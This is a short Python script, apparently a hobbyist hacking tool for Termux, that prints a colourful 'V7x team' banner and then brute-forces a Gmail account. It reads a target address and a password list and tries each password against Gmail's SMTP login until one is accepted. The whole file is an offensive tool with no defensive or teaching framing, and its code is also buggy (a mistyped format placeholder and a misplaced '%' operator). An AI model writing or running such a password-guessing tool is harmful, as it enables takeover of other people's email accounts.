import smtplib

H = '\033[95m' #purple
B = '\033[94m' #blue
G = '\033[92m' # green
W = '\033[93m' #yullow
F = '\033[91m' #red

print (F+ "                                    .::!!!!!!!:.")
print (F+ "    .!!!!!:.                       .:!!!!!!!!!!!!")
print (F+ "   ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$ ")
print (B+ "    $$$$:$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P ")
print (B+ "     $$$$$$$$   $WX!     .<!!!!UW$$$$   $$$$$$$$# ")
print (B+ "     $$$$$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$* ")
print (H+ "        $^$$$B  $$$$\     $$$$$$$$$$$$   d$$R* ")
print (H+ "         $*$bd$$$$       *$$$$$$$$$$o+### ")
print (H+ "             ****          *****")
print (F+ "  __      ________       _______  ")
print (F+ "  \ \    / /___   |     |__   __| ")
print (F+ "   \ \  / /    / /_  __    | | ___  __ _ _ __ ___  ")
print (F+ "    \ \/ /    / /\ \/ /    | |/ _ \/ _` | '_ ` _ \ ")
print (F+ "     \  /    / /  >  <     | |  __/ (_| | | | | | | ")
print (F+ "      \/    /_/  /_/\_\    |_|\___|\__,_|_| |_| |_| ")
print (B+ "__________________________________________________________________________")
print (W+"| coded by: V7x team                                                       |")
print (H+"|                                                                          |")
print (B+"| github email:https://github.com/samklo4                                  |")
print (H+"|                                                                          |")
print (B+"| This Tool made for Termux users                                          |")
print (H+"|                                                                          |")
print (W+"| YouTube channel:https://www.youtube.com/channel/UC7szA0yRSQnZ9HbLoR2JIOQ |")
print (B+"|__________________________________________________________________________|")

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
user = raw_input("Enter email : ")
passwfile = raw_input ("Enter password list : ")
passwfile = open (passwfile, "r")

for password in passwfile :
       try :
            smtpserver.login(user, password)
            print (" [+] pssword fond ==> $s") % password
            break;

       except smtplib.SMTPAuthenticationError:
            print ("[!]password is incorect ===> %s") % password
